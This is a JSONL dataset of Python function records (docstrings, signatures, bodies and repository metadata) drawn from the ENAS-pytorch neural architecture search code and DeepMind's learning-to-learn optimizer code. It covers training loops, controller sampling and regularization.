{"docstring": "\"\"\"Returns a the `torch.no_grad` context manager for PyTorch version >=\n0.4, or a no-op context manager otherwise.\n\"\"\"\n", "func_signal": "def _get_no_grad_ctx_mgr():\n", "code": "if float(torch.__version__[0:3]) >= 0.4:\n    return torch.no_grad()\n\nreturn contextlib.suppress()", "path": "ENAS-pytorch/trainer.py", "commit_date": "2018-11-06 00:00:00", "repo_name": "carpedm20/ENAS-pytorch", "stars": 2677, "license": "apache-2.0", "language": "python", "size": 13520}
{"docstring": "\"\"\"Logs a set of training steps.\"\"\"\n", "func_signal": "def _summarize_shared_train(self, total_loss, raw_total_loss):\n", "code": "cur_loss = utils.to_item(total_loss) / self.args.log_step\n# NOTE(brendan): The raw loss, without adding in the activation\n# regularization terms, should be used to compute ppl.\ncur_raw_loss = utils.to_item(raw_total_loss) / self.args.log_step\nppl = math.exp(cur_raw_loss)\n\nlogger.info(f'| epoch {self.epoch:3d} '\n            f'| lr {self.shared_lr:4.2f} '\n            f'| raw loss {cur_raw_loss:.2f} '\n            f'| loss {cur_loss:.2f} '\n            f'| ppl {ppl:8.2f}')\n\n# Tensorboard\nif self.tb is not None:\n    self.tb.scalar_summary('shared/loss',\n                           cur_loss,\n                           self.shared_step)\n    self.tb.scalar_summary('shared/perplexity',\n                           ppl,\n                           self.shared_step)", "path": "ENAS-pytorch/trainer.py", "commit_date": "2018-11-06 00:00:00", "repo_name": "carpedm20/ENAS-pytorch", "stars": 2677, "license": "apache-2.0", "language": "python", "size": 13520}
{"docstring": "# code from https://github.com/pytorch/examples/blob/master/word_language_model/main.py \n", "func_signal": "def batchify(data, bsz, use_cuda):\n", "code": "nbatch = data.size(0) // bsz\ndata = data.narrow(0, 0, nbatch * bsz)\ndata = data.view(bsz, -1).t().contiguous()\nif use_cuda:\n    data = data.cuda()\nreturn data", "path": "ENAS-pytorch/utils.py", "commit_date": "2018-11-06 00:00:00", "repo_name": "carpedm20/ENAS-pytorch", "stars": 2677, "license": "apache-2.0", "language": "python", "size": 13520}
{"docstring": "\"\"\"Based on `args`, optionally adds regularization penalty terms for\nactivation regularization, temporal activation regularization and/or hidden\nstate norm stabilization.\n\nArgs:\n    extra_out[*]:\n        dropped: Post-dropout activations.\n        hiddens: All hidden states for a batch of sequences.\n        raw: Pre-dropout activations.\n\nReturns:\n    The penalty term associated with all of the enabled regularizations.\n\nSee:\n    Regularizing and Optimizing LSTM Language Models (Merity et al., 2017)\n    Regularizing RNNs by Stabilizing Activations (Krueger & Memsevic, 2016)\n\"\"\"\n", "func_signal": "def _apply_penalties(extra_out, args):\n", "code": "penalty = 0\n\n# Activation regularization.\nif args.activation_regularization:\n    penalty += (args.activation_regularization_amount *\n                extra_out['dropped'].pow(2).mean())\n\n# Temporal activation regularization (slowness)\nif args.temporal_activation_regularization:\n    raw = extra_out['raw']\n    penalty += (args.temporal_activation_regularization_amount *\n                (raw[1:] - raw[:-1]).pow(2).mean())\n\n# Norm stabilizer regularization\nif args.norm_stabilizer_regularization:\n    penalty += (args.norm_stabilizer_regularization_amount *\n                (extra_out['hiddens'].norm(dim=-1) -\n                 args.norm_stabilizer_fixed_point).pow(2).mean())\n\nreturn penalty", "path": "ENAS-pytorch/trainer.py", "commit_date": "2018-11-06 00:00:00", "repo_name": "carpedm20/ENAS-pytorch", "stars": 2677, "license": "apache-2.0", "language": "python", "size": 13520}
{"docstring": "\"\"\"Train the language model for 400 steps of minibatches of 64\nexamples.\n\nArgs:\n    max_step: Used to run extra training steps as a warm-up.\n    dag: If not None, is used instead of calling sample().\n\nBPTT is truncated at 35 timesteps.\n\nFor each weight update, gradients are estimated by sampling M models\nfrom the fixed controller policy, and averaging their gradients\ncomputed on a batch of training data.\n\"\"\"\n", "func_signal": "def train_shared(self, max_step=None, dag=None):\n", "code": "model = self.shared\nmodel.train()\nself.controller.eval()\n\nhidden = self.shared.init_hidden(self.args.batch_size)\n\nif max_step is None:\n    max_step = self.args.shared_max_step\nelse:\n    max_step = min(self.args.shared_max_step, max_step)\n\nabs_max_grad = 0\nabs_max_hidden_norm = 0\nstep = 0\nraw_total_loss = 0\ntotal_loss = 0\ntrain_idx = 0\n# TODO(brendan): Why - 1 - 1?\nwhile train_idx < self.train_data.size(0) - 1 - 1:\n    if step > max_step:\n        break\n\n    dags = dag if dag else self.controller.sample(\n        self.args.shared_num_sample)\n    inputs, targets = self.get_batch(self.train_data,\n                                     train_idx,\n                                     self.max_length)\n\n    loss, hidden, extra_out = self.get_loss(inputs,\n                                            targets,\n                                            hidden,\n                                            dags)\n    hidden.detach_()\n    raw_total_loss += loss.data\n\n    loss += _apply_penalties(extra_out, self.args)\n\n    # update\n    self.shared_optim.zero_grad()\n    loss.backward()\n\n    h1tohT = extra_out['hiddens']\n    new_abs_max_hidden_norm = utils.to_item(\n        h1tohT.norm(dim=-1).data.max())\n    if new_abs_max_hidden_norm > abs_max_hidden_norm:\n        abs_max_hidden_norm = new_abs_max_hidden_norm\n        logger.info(f'max hidden {abs_max_hidden_norm}')\n    abs_max_grad = _check_abs_max_grad(abs_max_grad, model)\n    torch.nn.utils.clip_grad_norm(model.parameters(),\n                                  self.args.shared_grad_clip)\n    self.shared_optim.step()\n\n    total_loss += loss.data\n\n    if ((step % self.args.log_step) == 0) and (step > 0):\n        self._summarize_shared_train(total_loss, raw_total_loss)\n        raw_total_loss = 0\n        total_loss = 0\n\n    step += 1\n    self.shared_step += 1\n    train_idx += self.max_length", "path": "ENAS-pytorch/trainer.py", "commit_date": "2018-11-06 00:00:00", "repo_name": "carpedm20/ENAS-pytorch", "stars": 2677, "license": "apache-2.0", "language": "python", "size": 13520}
{"docstring": "\"\"\"Sets the directories for the model, and creates those directories.\n\nArgs:\n    args: Parsed from `argparse` in the `config` module.\n\"\"\"\n", "func_signal": "def prepare_dirs(args):\n", "code": "if args.load_path:\n    if args.load_path.startswith(args.log_dir):\n        args.model_dir = args.load_path\n    else:\n        if args.load_path.startswith(args.dataset):\n            args.model_name = args.load_path\n        else:\n            args.model_name = \"{}_{}\".format(args.dataset, args.load_path)\nelse:\n    args.model_name = \"{}_{}\".format(args.dataset, get_time())\n\nif not hasattr(args, 'model_dir'):\n    args.model_dir = os.path.join(args.log_dir, args.model_name)\nargs.data_path = os.path.join(args.data_dir, args.dataset)\n\nfor path in [args.log_dir, args.data_dir, args.model_dir]:\n    if not os.path.exists(path):\n        makedirs(path)", "path": "ENAS-pytorch/utils.py", "commit_date": "2018-11-06 00:00:00", "repo_name": "carpedm20/ENAS-pytorch", "stars": 2677, "license": "apache-2.0", "language": "python", "size": 13520}
{"docstring": "\"\"\"TODO(brendan): We are always deriving based on the very first batch\nof validation data? This seems wrong...\n\"\"\"\n", "func_signal": "def derive(self, sample_num=None, valid_idx=0):\n", "code": "hidden = self.shared.init_hidden(self.args.batch_size)\n\nif sample_num is None:\n    sample_num = self.args.derive_num_sample\n\ndags, _, entropies = self.controller.sample(sample_num,\n                                            with_details=True)\n\nmax_R = 0\nbest_dag = None\nfor dag in dags:\n    R, _ = self.get_reward(dag, entropies, hidden, valid_idx)\n    if R.max() > max_R:\n        max_R = R.max()\n        best_dag = dag\n\nlogger.info(f'derive | max_R: {max_R:8.6f}')\nfname = (f'{self.epoch:03d}-{self.controller_step:06d}-'\n         f'{max_R:6.4f}-best.png')\npath = os.path.join(self.args.model_dir, 'networks', fname)\nutils.draw_network(best_dag, path)\nself.tb.image_summary('derive/best', [path], self.epoch)\n\nreturn best_dag", "path": "ENAS-pytorch/trainer.py", "commit_date": "2018-11-06 00:00:00", "repo_name": "carpedm20/ENAS-pytorch", "stars": 2677, "license": "apache-2.0", "language": "python", "size": 13520}
{"docstring": "\"\"\"Fixes the shared parameters and updates the controller parameters.\n\nThe controller is updated with a score function gradient estimator\n(i.e., REINFORCE), with the reward being c/valid_ppl, where valid_ppl\nis computed on a minibatch of validation data.\n\nA moving average baseline is used.\n\nThe controller is trained for 2000 steps per epoch (i.e.,\nfirst (Train Shared) phase -> second (Train Controller) phase).\n\"\"\"\n", "func_signal": "def train_controller(self):\n", "code": "model = self.controller\nmodel.train()\n# TODO(brendan): Why can't we call shared.eval() here? Leads to loss\n# being uniformly zero for the controller.\n# self.shared.eval()\n\navg_reward_base = None\nbaseline = None\nadv_history = []\nentropy_history = []\nreward_history = []\n\nhidden = self.shared.init_hidden(self.args.batch_size)\ntotal_loss = 0\nvalid_idx = 0\nfor step in range(self.args.controller_max_step):\n    # sample models\n    dags, log_probs, entropies = self.controller.sample(\n        with_details=True)\n\n    # calculate reward\n    np_entropies = entropies.data.cpu().numpy()\n    # NOTE(brendan): No gradients should be backpropagated to the\n    # shared model during controller training, obviously.\n    with _get_no_grad_ctx_mgr():\n        rewards, hidden = self.get_reward(dags,\n                                          np_entropies,\n                                          hidden,\n                                          valid_idx)\n\n    # discount\n    if 1 > self.args.discount > 0:\n        rewards = discount(rewards, self.args.discount)\n\n    reward_history.extend(rewards)\n    entropy_history.extend(np_entropies)\n\n    # moving average baseline\n    if baseline is None:\n        baseline = rewards\n    else:\n        decay = self.args.ema_baseline_decay\n        baseline = decay * baseline + (1 - decay) * rewards\n\n    adv = rewards - baseline\n    adv_history.extend(adv)\n\n    # policy loss\n    loss = -log_probs*utils.get_variable(adv,\n                                         self.cuda,\n                                         requires_grad=False)\n    if self.args.entropy_mode == 'regularizer':\n        loss -= self.args.entropy_coeff * entropies\n\n    loss = loss.sum()  # or loss.mean()\n\n    # update\n    self.controller_optim.zero_grad()\n    loss.backward()\n\n    if self.args.controller_grad_clip > 0:\n        torch.nn.utils.clip_grad_norm(model.parameters(),\n                                      self.args.controller_grad_clip)\n    self.controller_optim.step()\n\n    total_loss += utils.to_item(loss.data)\n\n    if ((step % self.args.log_step) == 0) and (step > 0):\n        self._summarize_controller_train(total_loss,\n                                         adv_history,\n                                         entropy_history,\n                                         reward_history,\n                                         avg_reward_base,\n                                         dags)\n\n        reward_history, adv_history, entropy_history = [], [], []\n        total_loss = 0\n\n    self.controller_step += 1\n\n    prev_valid_idx = valid_idx\n    valid_idx = ((valid_idx + self.max_length) %\n                 (self.valid_data.size(0) - 1))\n    # NOTE(brendan): Whenever we wrap around to the beginning of the\n    # validation data, we reset the hidden states.\n    if prev_valid_idx > valid_idx:\n        hidden = self.shared.init_hidden(self.args.batch_size)", "path": "ENAS-pytorch/trainer.py", "commit_date": "2018-11-06 00:00:00", "repo_name": "carpedm20/ENAS-pytorch", "stars": 2677, "license": "apache-2.0", "language": "python", "size": 13520}
{"docstring": "\"\"\"Evaluate on the validation set.\n\nNOTE(brendan): We should not be using the test set to develop the\nalgorithm (basic machine learning good practices).\n\"\"\"\n", "func_signal": "def evaluate(self, source, dag, name, batch_size=1, max_num=None):\n", "code": "self.shared.eval()\nself.controller.eval()\n\ndata = source[:max_num*self.max_length]\n\ntotal_loss = 0\nhidden = self.shared.init_hidden(batch_size)\n\npbar = range(0, data.size(0) - 1, self.max_length)\nfor count, idx in enumerate(pbar):\n    inputs, targets = self.get_batch(data, idx, volatile=True)\n    output, hidden, _ = self.shared(inputs,\n                                    dag,\n                                    hidden=hidden,\n                                    is_train=False)\n    output_flat = output.view(-1, self.dataset.num_tokens)\n    total_loss += len(inputs) * self.ce(output_flat, targets).data\n    hidden.detach_()\n    ppl = math.exp(utils.to_item(total_loss) / (count + 1) / self.max_length)\n\nval_loss = utils.to_item(total_loss) / len(data)\nppl = math.exp(val_loss)\n\nself.tb.scalar_summary(f'eval/{name}_loss', val_loss, self.epoch)\nself.tb.scalar_summary(f'eval/{name}_ppl', ppl, self.epoch)\nlogger.info(f'eval | loss: {val_loss:8.2f} | ppl: {ppl:8.2f}')", "path": "ENAS-pytorch/trainer.py", "commit_date": "2018-11-06 00:00:00", "repo_name": "carpedm20/ENAS-pytorch", "stars": 2677, "license": "apache-2.0", "language": "python", "size": 13520}
{"docstring": "\"\"\"Constructs a set of DAGs based on the actions, i.e., previous nodes and\nactivation functions, sampled from the controller/policy pi.\n\nArgs:\n    prev_nodes: Previous node actions from the policy.\n    activations: Activations sampled from the policy.\n    func_names: Mapping from activation function names to functions.\n    num_blocks: Number of blocks in the target RNN cell.\n\nReturns:\n    A list of DAGs defined by the inputs.\n\nRNN cell DAGs are represented in the following way:\n\n1. Each element (node) in a DAG is a list of `Node`s.\n\n2. The `Node`s in the list dag[i] correspond to the subsequent nodes\n   that take the output from node i as their own input.\n\n3. dag[-1] is the node that takes input from x^{(t)} and h^{(t - 1)}.\n   dag[-1] always feeds dag[0].\n   dag[-1] acts as if `w_xc`, `w_hc`, `w_xh` and `w_hh` are its\n   weights.\n\n4. dag[N - 1] is the node that produces the hidden state passed to\n   the next timestep. dag[N - 1] is also always a leaf node, and therefore\n   is always averaged with the other leaf nodes and fed to the output\n   decoder.\n\"\"\"\n", "func_signal": "def _construct_dags(prev_nodes, activations, func_names, num_blocks):\n", "code": "dags = []\nfor nodes, func_ids in zip(prev_nodes, activations):\n    dag = collections.defaultdict(list)\n\n    # add first node\n    dag[-1] = [Node(0, func_names[func_ids[0]])]\n    dag[-2] = [Node(0, func_names[func_ids[0]])]\n\n    # add following nodes\n    for jdx, (idx, func_id) in enumerate(zip(nodes, func_ids[1:])):\n        dag[utils.to_item(idx)].append(Node(jdx + 1, func_names[func_id]))\n\n    leaf_nodes = set(range(num_blocks)) - dag.keys()\n\n    # merge with avg\n    for idx in leaf_nodes:\n        dag[idx] = [Node(num_blocks, 'avg')]\n\n    # TODO(brendan): This is actually y^{(t)}. h^{(t)} is node N - 1 in\n    # the graph, where N Is the number of nodes. I.e., h^{(t)} takes\n    # only one other node as its input.\n    # last h[t] node\n    last_node = Node(num_blocks + 1, 'h[t]')\n    dag[num_blocks] = [last_node]\n    dags.append(dag)\n\nreturn dags", "path": "ENAS-pytorch/models/controller.py", "commit_date": "2018-11-06 00:00:00", "repo_name": "carpedm20/ENAS-pytorch", "stars": 2677, "license": "apache-2.0", "language": "python", "size": 13520}
{"docstring": "\"\"\"Converts x, possibly scalar and possibly tensor, to a Python scalar.\"\"\"\n", "func_signal": "def to_item(x):\n", "code": "if isinstance(x, (float, int)):\n    return x\n\nif float(torch.__version__[0:3]) < 0.4:\n    assert (x.dim() == 1) and (len(x) == 1)\n    return x[0]\n\nreturn x.item()", "path": "ENAS-pytorch/utils.py", "commit_date": "2018-11-06 00:00:00", "repo_name": "carpedm20/ENAS-pytorch", "stars": 2677, "license": "apache-2.0", "language": "python", "size": 13520}
{"docstring": "\"\"\"Computes a single pass through the discovered RNN cell.\"\"\"\n", "func_signal": "def cell(self, x, h_prev, dag):\n", "code": "c = {}\nh = {}\nf = {}\n\nf[0] = self.get_f(dag[-1][0].name)\nc[0] = F.sigmoid(self.w_xc(x) + F.linear(h_prev, self.w_hc, None))\nh[0] = (c[0]*f[0](self.w_xh(x) + F.linear(h_prev, self.w_hh, None)) +\n        (1 - c[0])*h_prev)\n\nleaf_node_ids = []\nq = collections.deque()\nq.append(0)\n\n# NOTE(brendan): Computes connections from the parent nodes `node_id`\n# to their child nodes `next_id` recursively, skipping leaf nodes. A\n# leaf node is a node whose id == `self.args.num_blocks`.\n#\n# Connections between parent i and child j should be computed as\n# h_j = c_j*f_{ij}{(W^h_{ij}*h_i)} + (1 - c_j)*h_i,\n# where c_j = \\sigmoid{(W^c_{ij}*h_i)}\n#\n# See Training details from Section 3.1 of the paper.\n#\n# The following algorithm does a breadth-first (since `q.popleft()` is\n# used) search over the nodes and computes all the hidden states.\nwhile True:\n    if len(q) == 0:\n        break\n\n    node_id = q.popleft()\n    nodes = dag[node_id]\n\n    for next_node in nodes:\n        next_id = next_node.id\n        if next_id == self.args.num_blocks:\n            leaf_node_ids.append(node_id)\n            assert len(nodes) == 1, ('parent of leaf node should have '\n                                     'only one child')\n            continue\n\n        w_h = self.w_h[node_id][next_id]\n        w_c = self.w_c[node_id][next_id]\n\n        f[next_id] = self.get_f(next_node.name)\n        c[next_id] = F.sigmoid(w_c(h[node_id]))\n        h[next_id] = (c[next_id]*f[next_id](w_h(h[node_id])) +\n                      (1 - c[next_id])*h[node_id])\n\n        q.append(next_id)\n\n# TODO(brendan): Instead of averaging loose ends, perhaps there should\n# be a set of separate unshared weights for each \"loose\" connection\n# between each node in a cell and the output.\n#\n# As it stands, all weights W^h_{ij} are doing double duty by\n# connecting both from i to j, as well as from i to the output.\n\n# average all the loose ends\nleaf_nodes = [h[node_id] for node_id in leaf_node_ids]\noutput = torch.mean(torch.stack(leaf_nodes, 2), -1)\n\n# stabilizing the Updates of omega\nif self.batch_norm is not None:\n    output = self.batch_norm(output)\n\nreturn output, h[self.args.num_blocks - 1]", "path": "ENAS-pytorch/models/shared_rnn.py", "commit_date": "2018-03-11 00:00:00", "repo_name": "carpedm20/ENAS-pytorch", "stars": 2677, "license": "apache-2.0", "language": "python", "size": 13520}
{"docstring": "\"\"\"Creates and initializes the shared and controller models.\"\"\"\n", "func_signal": "def build_model(self):\n", "code": "if self.args.network_type == 'rnn':\n    self.shared = models.RNN(self.args, self.dataset)\nelif self.args.network_type == 'cnn':\n    self.shared = models.CNN(self.args, self.dataset)\nelse:\n    raise NotImplementedError(f'Network type '\n                              f'`{self.args.network_type}` is not '\n                              f'defined')\nself.controller = models.Controller(self.args)\n\nif self.args.num_gpu == 1:\n    self.shared.cuda()\n    self.controller.cuda()\nelif self.args.num_gpu > 1:\n    raise NotImplementedError('`num_gpu > 1` is in progress')", "path": "ENAS-pytorch/trainer.py", "commit_date": "2018-11-06 00:00:00", "repo_name": "carpedm20/ENAS-pytorch", "stars": 2677, "license": "apache-2.0", "language": "python", "size": 13520}
{"docstring": "# code from\n# https://github.com/pytorch/examples/blob/master/word_language_model/main.py\n", "func_signal": "def get_batch(self, source, idx, length=None, volatile=False):\n", "code": "length = min(length if length else self.max_length,\n             len(source) - 1 - idx)\ndata = Variable(source[idx:idx + length], volatile=volatile)\ntarget = Variable(source[idx + 1:idx + 1 + length].view(-1),\n                  volatile=volatile)\nreturn data, target", "path": "ENAS-pytorch/trainer.py", "commit_date": "2018-11-06 00:00:00", "repo_name": "carpedm20/ENAS-pytorch", "stars": 2677, "license": "apache-2.0", "language": "python", "size": 13520}
{"docstring": "\"\"\"Checks `model` for a new largest gradient for this epoch, in order to\ntrack gradient explosions.\n\"\"\"\n", "func_signal": "def _check_abs_max_grad(abs_max_grad, model):\n", "code": "finite_grads = [p.grad.data\n                for p in model.parameters()\n                if p.grad is not None]\n\nnew_max_grad = max([grad.max() for grad in finite_grads])\nnew_min_grad = min([grad.min() for grad in finite_grads])\n\nnew_abs_max_grad = max(new_max_grad, abs(new_min_grad))\nif new_abs_max_grad > abs_max_grad:\n    logger.info(f'abs max grad {abs_max_grad}')\n    return new_abs_max_grad\n\nreturn abs_max_grad", "path": "ENAS-pytorch/trainer.py", "commit_date": "2018-11-06 00:00:00", "repo_name": "carpedm20/ENAS-pytorch", "stars": 2677, "license": "apache-2.0", "language": "python", "size": 13520}
{"docstring": "\"\"\"Cycles through alternately training the shared parameters and the\ncontroller, as described in Section 2.2, Training ENAS and Deriving\nArchitectures, of the paper.\n\nFrom the paper (for Penn Treebank):\n\n- In the first phase, shared parameters omega are trained for 400\n  steps, each on a minibatch of 64 examples.\n\n- In the second phase, the controller's parameters are trained for 2000\n  steps.\n  \nArgs:\n    single (bool): If True it won't train the controller and use the\n                   same dag instead of derive().\n\"\"\"\n", "func_signal": "def train(self, single=False):\n", "code": "dag = utils.load_dag(self.args) if single else None\n\nif self.args.shared_initial_step > 0:\n    self.train_shared(self.args.shared_initial_step)\n    self.train_controller()\n\nfor self.epoch in range(self.start_epoch, self.args.max_epoch):\n    # 1. Training the shared parameters omega of the child models\n    self.train_shared(dag=dag)\n\n    # 2. Training the controller parameters theta\n    if not single:\n        self.train_controller()\n\n    if self.epoch % self.args.save_epoch == 0:\n        with _get_no_grad_ctx_mgr():\n            best_dag = dag if dag else self.derive()\n            self.evaluate(self.eval_data,\n                          best_dag,\n                          'val_best',\n                          max_num=self.args.batch_size*100)\n        self.save_model()\n\n    if self.epoch >= self.args.shared_decay_after:\n        utils.update_lr(self.shared_optim, self.shared_lr)", "path": "ENAS-pytorch/trainer.py", "commit_date": "2018-11-06 00:00:00", "repo_name": "carpedm20/ENAS-pytorch", "stars": 2677, "license": "apache-2.0", "language": "python", "size": 13520}
{"docstring": "\"\"\"Drops out weights to implement DropConnect.\n\nArgs:\n    w_raw: Full, pre-dropout, weights to be dropped out.\n    dropout_p: Proportion of weights to drop out.\n    is_training: True iff _shared_ model is training.\n\nReturns:\n    The dropped weights.\n\nTODO(brendan): Why does torch.nn.functional.dropout() return:\n1. `torch.autograd.Variable()` on the training loop\n2. `torch.nn.Parameter()` on the controller or eval loop, when\ntraining = False...\n\nEven though the call to `_setweights` in the Smerity repo's\n`weight_drop.py` does not have this behaviour, and `F.dropout` always\nreturns `torch.autograd.Variable` there, even when `training=False`?\n\nThe above TODO is the reason for the hacky check for `torch.nn.Parameter`.\n\"\"\"\n", "func_signal": "def _get_dropped_weights(w_raw, dropout_p, is_training):\n", "code": "dropped_w = F.dropout(w_raw, p=dropout_p, training=is_training)\n\nif isinstance(dropped_w, torch.nn.Parameter):\n    dropped_w = dropped_w.clone()\n\nreturn dropped_w", "path": "ENAS-pytorch/models/shared_rnn.py", "commit_date": "2018-03-11 00:00:00", "repo_name": "carpedm20/ENAS-pytorch", "stars": 2677, "license": "apache-2.0", "language": "python", "size": 13520}
{"docstring": "\"\"\"Computes the loss for the same batch for M models.\n\nThis amounts to an estimate of the loss, which is turned into an\nestimate for the gradients of the shared model.\n\"\"\"\n", "func_signal": "def get_loss(self, inputs, targets, hidden, dags):\n", "code": "if not isinstance(dags, list):\n    dags = [dags]\n\nloss = 0\nfor dag in dags:\n    output, hidden, extra_out = self.shared(inputs, dag, hidden=hidden)\n    output_flat = output.view(-1, self.dataset.num_tokens)\n    sample_loss = (self.ce(output_flat, targets) /\n                   self.args.shared_num_sample)\n    loss += sample_loss\n\nassert len(dags) == 1, 'there are multiple `hidden` for multple `dags`'\nreturn loss, hidden, extra_out", "path": "ENAS-pytorch/trainer.py", "commit_date": "2018-11-06 00:00:00", "repo_name": "carpedm20/ENAS-pytorch", "stars": 2677, "license": "apache-2.0", "language": "python", "size": 13520}
{"docstring": "\"\"\"Samples a set of `args.num_blocks` many computational nodes from the\ncontroller, where each node is made up of an activation function, and\neach node except the last also includes a previous node.\n\"\"\"\n", "func_signal": "def sample(self, batch_size=1, with_details=False, save_dir=None):\n", "code": "if batch_size < 1:\n    raise Exception(f'Wrong batch_size: {batch_size} < 1')\n\n# [B, L, H]\ninputs = self.static_inputs[batch_size]\nhidden = self.static_init_hidden[batch_size]\n\nactivations = []\nentropies = []\nlog_probs = []\nprev_nodes = []\n# NOTE(brendan): The RNN controller alternately outputs an activation,\n# followed by a previous node, for each block except the last one,\n# which only gets an activation function. The last node is the output\n# node, and its previous node is the average of all leaf nodes.\nfor block_idx in range(2*(self.args.num_blocks - 1) + 1):\n    logits, hidden = self.forward(inputs,\n                                  hidden,\n                                  block_idx,\n                                  is_embed=(block_idx == 0))\n\n    probs = F.softmax(logits, dim=-1)\n    log_prob = F.log_softmax(logits, dim=-1)\n    # TODO(brendan): .mean() for entropy?\n    entropy = -(log_prob * probs).sum(1, keepdim=False)\n\n    action = probs.multinomial(num_samples=1).data\n    selected_log_prob = log_prob.gather(\n        1, utils.get_variable(action, requires_grad=False))\n\n    # TODO(brendan): why the [:, 0] here? Should it be .squeeze(), or\n    # .view()? Same below with `action`.\n    entropies.append(entropy)\n    log_probs.append(selected_log_prob[:, 0])\n\n    # 0: function, 1: previous node\n    mode = block_idx % 2\n    inputs = utils.get_variable(\n        action[:, 0] + sum(self.num_tokens[:mode]),\n        requires_grad=False)\n\n    if mode == 0:\n        activations.append(action[:, 0])\n    elif mode == 1:\n        prev_nodes.append(action[:, 0])\n\nprev_nodes = torch.stack(prev_nodes).transpose(0, 1)\nactivations = torch.stack(activations).transpose(0, 1)\n\ndags = _construct_dags(prev_nodes,\n                       activations,\n                       self.func_names,\n                       self.args.num_blocks)\n\nif save_dir is not None:\n    for idx, dag in enumerate(dags):\n        utils.draw_network(dag,\n                           os.path.join(save_dir, f'graph{idx}.png'))\n\nif with_details:\n    return dags, torch.cat(log_probs), torch.cat(entropies)\n\nreturn dags", "path": "ENAS-pytorch/models/controller.py", "commit_date": "2018-11-06 00:00:00", "repo_name": "carpedm20/ENAS-pytorch", "stars": 2677, "license": "apache-2.0", "language": "python", "size": 13520}
{"docstring": "\"\"\"Computes the perplexity of a single sampled model on a minibatch of\nvalidation data.\n\"\"\"\n", "func_signal": "def get_reward(self, dag, entropies, hidden, valid_idx=0):\n", "code": "if not isinstance(entropies, np.ndarray):\n    entropies = entropies.data.cpu().numpy()\n\ninputs, targets = self.get_batch(self.valid_data,\n                                 valid_idx,\n                                 self.max_length,\n                                 volatile=True)\nvalid_loss, hidden, _ = self.get_loss(inputs, targets, hidden, dag)\nvalid_loss = utils.to_item(valid_loss.data)\n\nvalid_ppl = math.exp(valid_loss)\n\n# TODO: we don't know reward_c\nif self.args.ppl_square:\n    # TODO: but we do know reward_c=80 in the previous paper\n    R = self.args.reward_c / valid_ppl ** 2\nelse:\n    R = self.args.reward_c / valid_ppl\n\nif self.args.entropy_mode == 'reward':\n    rewards = R + self.args.entropy_coeff * entropies\nelif self.args.entropy_mode == 'regularizer':\n    rewards = R * np.ones_like(entropies)\nelse:\n    raise NotImplementedError(f'Unkown entropy mode: {self.args.entropy_mode}')\n\nreturn rewards, hidden", "path": "ENAS-pytorch/trainer.py", "commit_date": "2018-11-06 00:00:00", "repo_name": "carpedm20/ENAS-pytorch", "stars": 2677, "license": "apache-2.0", "language": "python", "size": 13520}
{"docstring": "\"\"\"L2L training.\"\"\"\n", "func_signal": "def train(sess, minimize_ops, num_epochs, num_unrolls):\n", "code": "step, update, reset, loss_last, x_last = minimize_ops\n\nfor _ in xrange(num_epochs):\n  sess.run(reset)\n  for _ in xrange(num_unrolls):\n    cost, final_x, unused_1, unused_2 = sess.run([loss_last, x_last,\n                                                  update, step])\n\nreturn cost, final_x", "path": "learning-to-learn/meta_test.py", "commit_date": "2017-04-07 00:00:00", "repo_name": "google-deepmind/learning-to-learn", "stars": 4062, "license": "apache-2.0", "language": "python", "size": 90}
{"docstring": "\"\"\"L2L training.\"\"\"\n", "func_signal": "def train(sess, minimize_ops, num_epochs, num_unrolls):\n", "code": "step, update, reset, loss_last, x_last = minimize_ops\n\nfor _ in xrange(num_epochs):\n  sess.run(reset)\n  for _ in xrange(num_unrolls):\n    cost, final_x, unused_1, unused_2 = sess.run([loss_last, x_last,\n                                                  update, step])\n\nreturn cost, final_x", "path": "learning-to-learn/convergence_test.py", "commit_date": "2017-02-09 00:00:00", "repo_name": "google-deepmind/learning-to-learn", "stars": 4062, "license": "apache-2.0", "language": "python", "size": 90}
{"docstring": "\"\"\"Calls func, returning any variables created, but ignoring its return value.\n\nArgs:\n  func: Function to be called.\n\nReturns:\n  A tuple (variables, constants) where the first element is a list of\n  trainable variables and the second is the non-trainable variables.\n\"\"\"\n", "func_signal": "def _get_variables(func):\n", "code": "variables = []\nconstants = []\n\ndef custom_getter(getter, name, **kwargs):\n  trainable = kwargs[\"trainable\"]\n  kwargs[\"trainable\"] = False\n  variable = getter(name, **kwargs)\n  if trainable:\n    variables.append(variable)\n  else:\n    constants.append(variable)\n  return variable\n\nwith tf.name_scope(\"unused_graph\"):\n  _wrap_variable_creation(func, custom_getter)\n\nreturn variables, constants", "path": "learning-to-learn/meta.py", "commit_date": "2017-04-07 00:00:00", "repo_name": "google-deepmind/learning-to-learn", "stars": 4062, "license": "apache-2.0", "language": "python", "size": 90}
{"docstring": "\"\"\"Creates the optimizer networks.\n\nArgs:\n  variables: A list of variables to be optimized.\n  config: A dictionary of network configurations, each of which will be\n      passed to networks.Factory to construct a single optimizer net.\n  net_assignments: A list of tuples where each tuple is of the form (netid,\n      variable_names) and is used to assign variables to networks. netid must\n      be a key in config.\n\nReturns:\n  A tuple (nets, keys, subsets) where nets is a dictionary of created\n  optimizer nets such that the net with key keys[i] should be applied to the\n  subset of variables listed in subsets[i].\n\nRaises:\n  ValueError: If net_assignments is None and the configuration defines more\n      than one network.\n\"\"\"\n# create a dictionary which maps a variable name to its index within the\n# list of variables.\n", "func_signal": "def _make_nets(variables, config, net_assignments):\n", "code": "name_to_index = dict((v.name.split(\":\")[0], i)\n                     for i, v in enumerate(variables))\n\nif net_assignments is None:\n  if len(config) != 1:\n    raise ValueError(\"Default net_assignments can only be used if there is \"\n                     \"a single net config.\")\n\n  with tf.variable_scope(\"vars_optimizer\"):\n    key = next(iter(config))\n    kwargs = config[key]\n    net = networks.factory(**kwargs)\n\n  nets = {key: net}\n  keys = [key]\n  subsets = [range(len(variables))]\nelse:\n  nets = {}\n  keys = []\n  subsets = []\n  with tf.variable_scope(\"vars_optimizer\"):\n    for key, names in net_assignments:\n      if key in nets:\n        raise ValueError(\"Repeated netid in net_assigments.\")\n      nets[key] = networks.factory(**config[key])\n      subset = [name_to_index[name] for name in names]\n      keys.append(key)\n      subsets.append(subset)\n      print(\"Net: {}, Subset: {}\".format(key, subset))\n\n# subsets should be a list of disjoint subsets (as lists!) of the variables\n# and nets should be a list of networks to apply to each subset.\nreturn nets, keys, subsets", "path": "learning-to-learn/meta.py", "commit_date": "2017-04-07 00:00:00", "repo_name": "google-deepmind/learning-to-learn", "stars": 4062, "license": "apache-2.0", "language": "python", "size": 90}
